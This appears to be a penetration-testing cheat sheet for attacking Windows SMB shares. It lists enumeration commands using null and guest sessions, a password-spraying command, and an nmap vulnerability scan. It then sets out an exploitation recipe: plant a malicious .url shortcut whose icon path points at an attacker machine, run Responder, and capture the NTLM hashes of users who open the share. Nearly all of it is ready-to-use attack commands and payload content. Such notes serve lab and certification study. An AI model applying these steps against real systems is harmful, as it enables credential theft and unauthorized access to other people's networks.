
### Enumeration
```
enum4linux -a <ip>
enum4linux -a -u "guest" -p " " <ip>
for host in $(cat hosts.txt); do <command> "$host"; done

smbmap -u "" -p "" -P 445 -H <ip>
smbmap -u "guest" -p "" -P 445 -H <ip>

crackmapexec smb <ip> -u "" -p ""
crackmapexec smb <ip> -u "guest" -p ""

#Scan for CVES such as eternalblue
nmap -T4 -p445 --script smb-vuln* <ip>
```

```
impacket-smbclient '<domain>/<user>:<password>@<ip>'

crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success --shares
```

### Exploitation
#### Malicious Shortcut
```
If you have the ability to write to a windows share that is being used by other people. (https://github.com/Greenwolf/ntlm_theft)

1. Create file @malicious_shortcut.url
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\<kali-ip>\%USERNAME%.icon
IconIndex=1

2. Setup Responder: sudo responder -I tun0

3. Wait for victim to click and capture hash.

```